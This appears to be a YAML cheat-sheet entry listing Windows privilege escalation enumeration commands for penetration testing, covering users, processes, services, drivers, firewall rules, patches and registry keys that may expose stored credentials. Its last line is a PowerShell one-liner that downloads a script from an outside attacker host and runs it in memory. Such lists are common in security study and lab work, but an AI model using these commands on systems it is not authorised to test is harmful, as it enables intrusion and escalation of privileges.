---
functions:
  privilege-escalation:
    - description: Simplistic and standard checklist for windows privilege escalation, in no particular order
      code: |
        Feel free to copy paste the entire listing below
        - [ ] $env:UserName
        - [ ] $Env:Path
        - [ ] $env:PSModulePath
        - [ ] whoami
        - [ ] net user
        - [ ] net user <username>
        - [ ] hostname
        - [ ] systeminfo
        - [ ] systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
        - [ ] tasklist
        - [ ] wmic process where "ProcessID=1111" get CommandLine, ExecutablePath
        - [ ] wmic process where name^="hfs.exe" get ProcessId,Name,CommandLine
        - [ ] wmic process where name^="hfs.exe" call GetOwner
        - [ ] accesschk.exe -qvp -accepteula *
        - [ ] tasklist /SVC
        - [ ] ipconfig /all
        - [ ] route print
        - [ ] netstat -ano
        - [ ] netsh advfirewall show currentprofile
        - [ ] netsh advfirewall firewall show rule name=all
        - [ ] schtasks /query /fo LIST /v
        - [ ] driverquery /v
        - [ ] driverquery /v | findstr /V /C:"Microsoft" /C:"Windows "
        - [ ] driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
        - [ ] wmic product get name, version, vendor
        - [ ] wmic qfe get Caption, Description, HotFixID, InstalledOn
        - [ ] wmic service get name,displayname,pathname,startmode | findstr /i "auto"  
        - [ ] wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /V "Windows"  
        - [ ] wmic service list full
        - [ ] ./accesschk64.exe -accepteula -c Apache2.4 -l   # service control permission check
        - [ ] mountvol
        - [ ] reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
        - [ ] reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
        - [ ] reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

        - powershell -c "iex(iwr http://192.168.119.149:8000/Invoke-PrivescCheck.ps1 -usebasicparsing);Invoke-PrivescCheck"

resources: |
  https://github.com/itm4n/PrivescCheck
  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
  https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
---